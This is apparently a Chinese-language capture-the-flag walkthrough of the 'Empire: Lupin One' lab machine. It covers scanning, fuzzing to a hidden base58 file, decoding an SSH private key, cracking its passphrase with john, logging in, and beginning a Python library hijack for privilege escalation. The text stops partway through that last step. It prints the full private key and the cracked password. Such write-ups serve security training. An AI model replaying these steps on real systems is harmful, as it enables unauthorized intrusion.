
# 靶机描述

# 渗透过程

## 初始侦察

### nmap 端口扫描

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.240.194
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-17 05:38 EDT
Nmap scan report for 192.168.240.194
Host is up (0.0019s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:9F:60:96 (VMware)
```

### nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sT -sC -sV -O -p22,80 192.168.240.194  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-17 05:56 EDT
Nmap scan report for 192.168.240.194
Host is up (0.0014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)
|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)
|_  256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/~myfiles
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.48 (Debian)
MAC Address: 00:0C:29:9F:60:96 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.06 seconds

```

### nmap 漏洞脚本扫描

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap --script=vuln -p22,80 192.168.240.194

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-17 06:00 EDT
Nmap scan report for 192.168.240.194
Host is up (0.00085s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|   /robots.txt: Robots file
|   /image/: Potentially interesting directory w/ listing on 'apache/2.4.48 (debian)'
|_  /manual/: Potentially interesting folder
MAC Address: 00:0C:29:9F:60:96 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 31.21 seconds

```

信息汇总，2个端口，看来主要攻击面集中在 80 web端口方面，简单目录枚举存在robots.txt

## 80端口 web 渗透

### 目录扫描

```bash
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://192.168.240.194/                                    
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.240.194/__26-03-17_06-37-55.txt

Target: http://192.168.240.194/

[06:37:55] Starting: 
[06:37:56] 403 -  280B  - /.ht_wsr.txt
[06:37:56] 403 -  280B  - /.htaccess.bak1
[06:37:56] 403 -  280B  - /.htaccess.orig
[06:37:56] 403 -  280B  - /.htaccess_extra
[06:37:56] 403 -  280B  - /.htaccess.sample
[06:37:56] 403 -  280B  - /.htaccess.save
[06:37:56] 403 -  280B  - /.htaccessOLD
[06:37:56] 403 -  280B  - /.htaccess_sc
[06:37:56] 403 -  280B  - /.htaccessBAK
[06:37:56] 403 -  280B  - /.htaccessOLD2
[06:37:56] 403 -  280B  - /.htaccess_orig
[06:37:56] 403 -  280B  - /.htm
[06:37:56] 403 -  280B  - /.html
[06:37:56] 403 -  280B  - /.htpasswd_test
[06:37:56] 403 -  280B  - /.htpasswds
[06:37:56] 403 -  280B  - /.httr-oauth
[06:38:11] 301 -  318B  - /image  ->  http://192.168.240.194/image/
[06:38:12] 301 -  323B  - /javascript  ->  http://192.168.240.194/javascript/
[06:38:14] 200 -  208B  - /manual/index.html
[06:38:14] 301 -  319B  - /manual  ->  http://192.168.240.194/manual/
[06:38:20] 200 -   34B  - /robots.txt
[06:38:20] 403 -  280B  - /server-status/
[06:38:20] 403 -  280B  - /server-status

Task Completed

```

gobuster , feroxbuster, dirb 各字典均未发现额外有效信息
### robots.txt 文件

robots.txt 文件 禁止爬虫爬取 `/~myfiles` 

访问 提示让我们继续加油
![[Pasted image 20260317184533.png]]

### 主页面PNG图片 隐写排查

![[Pasted image 20260317200308.png]]

zsteg 、binwalk 均未有所发现

----
陷入瓶颈 不知道还如何往下撕口子

卡了一会儿 查看 wp ，提示进行 ~fuzz 

---

### ffuf 路径模糊测试

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.240.194/~FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.240.194/~FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

secret                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 3ms]
:: Progress: [4614/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

成功枚举出 `/~secret` 参数，301重定向至 `/~secret/` 目录 

![[Pasted image 20260317203318.png]]

页面内容理解：

```txt
你好朋友，

很高兴你能找到我的秘密目录。我专门创建了这里，是为了和你分享我创建的 SSH 私钥文件。

我把它藏在这一带的某个地方了，这样黑客就没法找到它，也没法用 fasttrack（字典）来破解我的密钥密码（Passphrase）了。

我很聪明吧，这我心里有数。

有任何问题随时告诉我。

你最好的朋友 icex64
```

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -ic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.240.194/~secret/.FUZZ -e .key,.txt,.p12,.pub,id_rsa,id_rsa.bak -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.240.194/~secret/.FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .key .txt .p12 .pub id_rsa id_rsa.bak 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 2ms]
                        [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 2ms]
mysecret.txt            [Status: 200, Size: 4689, Words: 1, Lines: 2, Duration: 8ms]
:: Progress: [1543829/1543829] :: Job [1/1] :: 9090 req/sec :: Duration: [0:02:05] :: Errors: 0 ::

```

---
- `-ic` 忽略字典中的注释行
- `-e` 指定要尝试的文件后缀名列表
- `-fc` 过滤掉特定的 HTTP 状态码
---
发现一个 `.mysecret.txt` 文件

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.240.194/~secret/.mysecret.txt     
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

```


### base58解密

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
iUJ66WmRUN9EoVlkeCzQJwivI=
-----END OPENSSH PRIVATE KEY-----
```

成功拿到私钥文件内容

```bash
┌──(kali㉿kali)-[~]
└─$ ssh-keygen -l -f id_rsa  
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
4096 SHA256:MBDkb47x64c8nQXqLxInBusjc1MywIWQOewYVFW3DkU no comment (RSA)

┌──(kali㉿kali)-[~]
└─$ ssh-keygen -y -f id_rsa
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
   
┌──(kali㉿kali)-[~]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~]
└─$ ssh-keygen -y -f id_rsa
Enter passphrase for "id_rsa": 
```

---
- `-l` 显示密钥指纹信息
-  `-y` 读取私钥文件内容，并计算/打印出对应的公钥
-  `-f` 指定要操作的文件路径，如果不加这个参数，`ssh-keygen` 默认会去 `~/.ssh/id_rsa` 找
---

由于私钥要求不可被其他用户读，所以修改私钥文件权限

重新读取私钥文件，提示该私钥文件被加密，需要输入密码，结合之前提示，尝试使用 `fasttrack` 字典，爆破密码

### john 破解私钥密码

```bash
┌──(kali㉿kali)-[~]
└─$ ssh2john id_rsa > id_rsa.hash

┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/fasttrack.txt id_rsa.hash
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@55w0rd!        (id_rsa)     
1g 0:00:00:03 DONE (2026-03-17 10:14) 0.2967g/s 28.48p/s 28.48c/s 28.48C/s Autumn2013..testing123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

提取私钥  hash指纹，并使用 `john` 配合 `fasttrack` 字典进行爆破，成功取得密码 `P@55w0rd!`

输入成功成功提取出 公钥内容 用户名 `icex64`
```bash
┌──(kali㉿kali)-[~]
└─$ ssh-keygen -y -f id_rsa
Enter passphrase for "id_rsa": 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5Ihe0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pfXdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClAhzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQ== icex64@LupinOne

```
## ssh私钥文件登录

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa icex64@192.168.240.194
The authenticity of host '192.168.240.194 (192.168.240.194)' can't be established.
ED25519 key fingerprint is SHA256:GZOCytQu/pnSRRTMvJLagwz7ZPlJMDiyabwLvxTrKME.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.240.194' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
########################################
Welcome to Empire: Lupin One
########################################
Last login: Thu Oct  7 05:41:43 2021 from 192.168.26.4
icex64@LupinOne:~$ whoami
icex64
icex64@LupinOne:~$ uname -a
Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64 GNU/Linux

```

成功获取系统立足点

## 提权

```bash
icex64@LupinOne:~$ sudo -l
Matching Defaults entries for icex64 on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User icex64 may run the following commands on LupinOne:
    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

可以无密码 以`arsene` 用户，运行python3解释器，执行heist.py文件

```bash
icex64@LupinOne:~$ cat /home/arsene/heist.py
import webbrowser

print ("Its not yet ready to get in action")

webbrowser.open("https://empirecybersecurity.co.mz")
```

### Python 库劫持

```bash
icex64@LupinOne:/tmp$ find / -type f -name "*webbrowser*" 2>/dev/null
/usr/lib/python3.9/webbrowser.py
/usr/lib/python3.9/__pycache__/webbrowser.cpython-39.pyc

```

```bash
icex64@LupinOne:/tmp$ ls -la /usr/lib/python3.9/webbrowser.py
